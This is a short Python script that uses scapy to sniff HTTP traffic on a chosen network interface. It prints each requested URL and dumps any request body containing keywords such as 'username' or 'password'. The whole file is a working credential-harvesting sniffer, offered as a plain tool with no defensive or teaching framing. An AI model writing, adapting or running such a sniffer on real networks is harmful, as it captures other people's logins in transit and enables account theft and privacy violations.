from termcolor import cprint
import subprocess
from scapy.layers.l2 import sniff, Raw
from scapy_http.http import HTTPRequest
import argparse
import os

INTERFACE = ''
KEYWORDS = ['username', 'user', 'mail', 'password', 'pass', 'psswd']

LINE = '____________________________________________'

def args_parser():
    global INTERFACE, VERBOSE
    #Parser of command line arguments
    parser = argparse.ArgumentParser()
    #Initialization of needed arguments
    parser.add_argument("-interface", "-if", dest="interface", help="Interface on which we apply packet sniffing")

    #Parse command line arguments
    args = parser.parse_args()
    
    #Check if the arguments have been specified on command line
    if not args.interface:
        parser.print_help()
        exit(0)
    
    INTERFACE = args.interface



def get_password(packet):
    if packet.haslayer(Raw):
        #Decode or str() in the beginning
        load = packet[Raw].load.decode()
        
        for keyword in KEYWORDS:
            if keyword in load:
                return load
    


def analyze_pkt(packet):
    if packet.haslayer(HTTPRequest):
        url = packet[HTTPRequest].Host.decode('utf-8') + packet[HTTPRequest].Path.decode('utf-8')
        cprint(f'{url}', 'yellow', attrs=['bold',])
        load = get_password(packet)
        if load:
            print(load, end='\n\n')
        else:
            print("Fields not in the dictionary", end='\n\n')
        


def main():
    args_parser()
    #Detection of passwords
    cprint(LINE+'\n  Detection of passwords \n'+LINE, 'red', attrs=['bold',])
    
    try:
        #No store of the packet but analyzing on fly
        sniff(iface=INTERFACE, store=False, prn=analyze_pkt)
    except KeyboardInterrupt:
        cprint(LINE, 'red', attrs=['bold',], end='\n\n')




if __name__=='__main__':
    main()
